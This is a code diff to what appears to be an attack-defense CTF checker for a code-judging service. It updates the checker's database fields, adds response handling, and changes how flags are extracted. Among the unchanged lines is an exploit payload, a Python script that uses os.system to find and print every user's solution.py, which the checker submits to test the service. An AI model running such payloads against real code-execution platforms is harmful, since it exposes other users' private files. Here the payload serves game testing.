@@ -209,7 +209,7 @@ async def getflag_drafts(
     task: GetflagCheckerTaskMessage, db: ChainDB, client: AsyncClient, logger: LoggerAdapter
 ) -> None:
     try:
-        username, password = await db.get("userdata")
+        username, password, problem_id = await db.get("userdata")
     except KeyError:
         raise MumbleException("Missing database entry from putflag")
     
@@ -325,7 +325,15 @@ async def exploit_solutions(task: ExploitCheckerTaskMessage,
     await conn.register_user(username, password)
     await conn.login_user(username, password)
 
-    problems = await conn.client.post("/api/problems")
+    problems_response = await conn.client.post("/api/problems")
+    
+    if problems_response.status_code not in [200, 201, 302]:
+        raise MumbleException(f"Failed to get problems: {problems_response.status_code}")
+    
+    problems = problems_response.json()
+    
+    if not problems or len(problems) == 0:
+        raise MumbleException("No problems available for exploit")
     
     exploit_script = """import os
 os.system('find submissions -type f -name "solution.py" | while read -r file; do echo "===== $file ====="; cat "$file"; echo; done')
@@ -339,13 +347,12 @@ os.system('find submissions -type f -name "solution.py" | while read -r file; do
     if response.status_code != 200:
         raise MumbleException(f"Failed to submit exploit: {response.status_code}")
     
-    data = response.text
+    data = response.text.replace('\/', '/')
 
-    escaped_flag = task.flag.replace('/', r'\/')
-    if task.flag not in data and escaped_flag not in data:
-        raise MumbleException("Flag was not found in the exploit output")
+    if flag := searcher.search_flag(data):
+        return flag
     
-    return task.flag
+    raise MumbleException(f"No flag found.")
 
 @checker.exploit(2)
 async def exploit_feedback(task: ExploitCheckerTaskMessage, 
